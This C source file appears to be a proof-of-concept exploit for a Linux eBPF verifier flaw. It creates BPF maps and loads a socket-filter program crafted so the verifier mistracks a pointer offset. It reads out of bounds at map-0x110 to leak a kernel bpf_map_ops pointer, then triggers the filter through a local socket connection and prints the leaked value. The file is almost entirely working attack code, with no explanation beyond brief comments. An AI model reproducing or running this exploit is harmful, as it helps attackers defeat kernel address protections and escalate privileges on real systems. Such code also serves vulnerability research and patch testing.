#include <linux/bpf.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "../../../include/linux/filter.h"

char logbuf[1024*1024];
char data_in[1024], data_out[1024], ctx_in[1024], ctx_out[1024];
extern int errno;

static int setup_listener_sock();
static int setup_send_sock();

#define STORAGE_PTR_REG     BPF_REG_3
#define CORRUPTED_PTR_REG   BPF_REG_4
#define SPECIAL_VAL_REG     BPF_REG_5
#define LEAKED_VAL_REG      BPF_REG_8

#define STORAGE_MAP_SIZE (8192)

int main(){

	// Create map for out-of-bound access
	unsigned long long key = 0;
    union bpf_attr corrupt_map = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = STORAGE_MAP_SIZE,
        .max_entries = 1,
    };

    strcpy(corrupt_map.map_name, "corrupt_map");
    int corrupt_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &corrupt_map, sizeof(corrupt_map));
    if (corrupt_map_fd < 0)
        return 0;

	// Set up the second, valid map in which we can store information
    key = 0;
    union bpf_attr storage_map = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = STORAGE_MAP_SIZE,
        .max_entries = 1
    };
    strcpy(storage_map.map_name, "storage_map");
    int storage_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &storage_map, sizeof(corrupt_map));
    if (storage_map_fd < 0) {
        return 0;
	}


	struct bpf_insn progBytecode[] = {
        BPF_MOV64_IMM(BPF_REG_2, 1000),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_DIV, BPF_REG_2, 3),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0, 2),
        BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, 200),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),
		BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, -0x110),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_3, -120),
        /* Load the corrupt map */
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, corrupt_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        // Trigger arbitrary read/write
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),
        // Access map-0x110
        BPF_LDX_MEM(BPF_DW, LEAKED_VAL_REG, BPF_REG_7, 0),
        // Save the leaked bpf_map_ops into the second map
        BPF_MOV64_IMM(BPF_REG_0, 0),    
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),  
        BPF_LD_MAP_FD(BPF_REG_1, storage_map_fd),  
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),    
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),  
        BPF_EXIT_INSN(),    
        BPF_MOV64_REG(STORAGE_PTR_REG, BPF_REG_0),  
        BPF_STX_MEM(BPF_DW, STORAGE_PTR_REG, LEAKED_VAL_REG, 0),
 		BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
};

    union bpf_attr progAttr;
    memset(&progAttr, 0, sizeof(progAttr));
    progAttr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    progAttr.license = (__u64)"Dual BSD/GPL";
    progAttr.log_level = 2;
    progAttr.log_size = 1024*1024;
    progAttr.log_buf = (__u64)logbuf;
    progAttr.insns = (__u64)progBytecode;
    progAttr.insn_cnt = sizeof(progBytecode)/sizeof(struct bpf_insn);
	progAttr.prog_flags = BPF_F_TEST_RND_HI32|BPF_F_TEST_STATE_FREQ;

    errno = 0;
    int fd = syscall(SYS_bpf, 0x5, &progAttr, sizeof(progAttr));
    printf("%s\n%s\n", logbuf, strerror(errno));

	/*
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.test.prog_fd = fd;
    attr.test.data_size_in = sizeof(data_in);
    attr.test.data_size_out = sizeof(data_out);
    attr.test.data_in = (__aligned_u64)data_in;
    attr.test.data_out = (__aligned_u64)data_out;
    errno = 0;
    int ret = syscall(SYS_bpf, 10, &attr, sizeof(attr));
    printf("BPF_PROG_TEST_RUN returns %d, %s, fd:%d\n", ret, strerror(errno), fd);
	*/

	int listener_sock = setup_listener_sock();
    int send_sock = setup_send_sock();
    if (listener_sock < 0 || send_sock < 0) {
        return 0;
	}
    if (setsockopt(listener_sock, SOL_SOCKET, SO_ATTACH_BPF, &fd,
               sizeof(fd)) < 0) {
        return 0;
    }
    // trigger execution by connecting to the listener socket
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1337);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    // no need to check connect, it will fail anyways
    connect(send_sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    close(listener_sock);
    close(send_sock);

	unsigned long lk[STORAGE_MAP_SIZE / sizeof(long long)];
    memset(lk, 0, sizeof(lk));
    key = 0;
	union bpf_attr lookup_map = {
        .map_fd = storage_map_fd,
        .key = (unsigned long long)&key,
        .value = (unsigned long long)&lk
    };
    int err = syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
    if (err < 0) {
        return 0;
	}

	printf("storage map value: %lx\n", *lk);
	return 0;
}

static int setup_listener_sock()
{
    int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    if (sock_fd < 0) {
        return sock_fd;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1337);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    if (err < 0)
        return err;

    err = listen(sock_fd, 32);
    if (err < 0)
        return err;

    return sock_fd;
}


static int setup_send_sock()
{
    return socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
}

